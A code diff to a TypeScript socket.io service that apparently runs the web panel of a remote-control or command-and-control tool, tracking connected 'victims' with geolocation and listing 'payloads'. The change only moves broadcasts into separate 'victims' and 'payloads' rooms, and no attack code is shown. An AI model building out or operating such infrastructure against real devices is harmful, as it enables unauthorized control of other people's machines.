@@ -1,7 +1,12 @@
 import geoip from 'geoip-lite';
 import { type Server as HTTPServer } from 'http';
 import { type Server as HTTPSServer } from 'https';
-import { type Namespace, Server, type Socket } from 'socket.io';
+import {
+    type BroadcastOperator,
+    type Namespace,
+    Server,
+    type Socket,
+} from 'socket.io';
 import { Inject, Service } from 'typedi';
 
 import {
@@ -38,9 +43,12 @@ export class SocketService {
     private readonly victimService!: VictimService;
 
     private readonly io: Server<IVictimToServerEvents, IServerToVictimEvents>;
-    public readonly webNS: Namespace<IWebToServerEvents, IServerToWebEvents>;
+    private readonly webNS: Namespace<IWebToServerEvents, IServerToWebEvents>;
     private readonly deviceNS: Namespace;
     private _listening: boolean = false;
+
+    public readonly payloadsRoom: BroadcastOperator<IServerToWebEvents, any>;
+    public readonly victimsRoom: BroadcastOperator<IServerToWebEvents, any>;
 
     public get listening(): boolean {
         return this._listening;
@@ -48,7 +56,7 @@ export class SocketService {
 
     public set listening(value: boolean) {
         this._listening = value;
-        this.webNS.emit(ServerToWebEvents.VICTIM_LISTENING_STATUS, value);
+        this.victimsRoom.emit(ServerToWebEvents.VICTIM_LISTENING_STATUS, value);
     }
 
     public constructor() {
@@ -60,6 +68,9 @@ export class SocketService {
         });
         this.webNS = this.io.of(SOCKET_NAMESPACE_WEB);
         this.deviceNS = this.io.of(SOCKET_NAMESPACE_DEVICE);
+        this.payloadsRoom = this.webNS.to('payloads');
+        this.victimsRoom = this.webNS.to('victims');
+
         this.setupListeners();
     }
 
@@ -67,14 +78,14 @@ export class SocketService {
         socket: Socket<IWebToServerEvents, IServerToWebEvents>,
     ): Promise<void> {
         socket.on(WebToServerEvents.LISTEN_FOR_VICTIMS, () => {
-            this.webNS.emit(
+            this.victimsRoom.emit(
                 ServerToWebEvents.VICTIM_LISTENING_STATUS,
                 this.listenForVictims(),
             );
         });
 
         socket.on(WebToServerEvents.STOP_LISTENING_FOR_VICTIMS, async () => {
-            this.webNS.emit(
+            this.victimsRoom.emit(
                 ServerToWebEvents.VICTIM_LISTENING_STATUS,
                 await this.stopListeningForVictims(),
             );
@@ -150,7 +161,7 @@ export class SocketService {
                 query.release,
             );
 
-            this.webNS.emit(ServerToWebEvents.VICTIM_CONNECTED, victim);
+            this.victimsRoom.emit(ServerToWebEvents.VICTIM_CONNECTED, victim);
         } catch (error) {
             logger.error('Failed to add or update victim', {
                 label: 'socket',
@@ -271,7 +282,10 @@ export class SocketService {
                     VictimStatus.DISCONNECTED,
                 );
 
-                this.webNS.emit(ServerToWebEvents.VICTIM_DISCONNECTED, victim);
+                this.victimsRoom.emit(
+                    ServerToWebEvents.VICTIM_DISCONNECTED,
+                    victim,
+                );
             } catch (error) {
                 logger.error('Failed to update victim status', {
                     label: 'socket',
@@ -334,9 +348,13 @@ export class SocketService {
             }
 
             if (socket.handshake.query?.page === 'payloads') {
+                await socket.join('payloads');
+
                 const payloads = await this.payloadService.list();
                 socket.emit(ServerToWebEvents.PAYLOAD_LIST, payloads);
             } else if (socket.handshake.query?.page === 'victims') {
+                await socket.join('victims');
+
                 socket.emit(
                     ServerToWebEvents.VICTIM_LISTENING_STATUS,
                     this.listening,
